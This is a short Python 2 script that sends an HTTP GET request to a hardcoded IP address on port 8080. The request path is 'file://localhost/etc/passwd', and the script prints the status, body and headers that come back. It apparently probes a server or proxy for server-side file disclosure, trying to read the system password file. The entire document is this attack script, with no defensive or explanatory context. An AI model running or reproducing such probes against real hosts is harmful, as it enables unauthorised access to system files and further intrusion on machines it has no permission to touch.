import httplib

def call(x):
	host = "188.40.147.125:8080"

	c = httplib.HTTPConnection(host)
	c.request("GET", x)
	r = c.getresponse()
	print r.status
	print r.read()
	print r.getheaders()
	c.close()


if __name__ == '__main__' :
	call("file://localhost/etc/passwd")
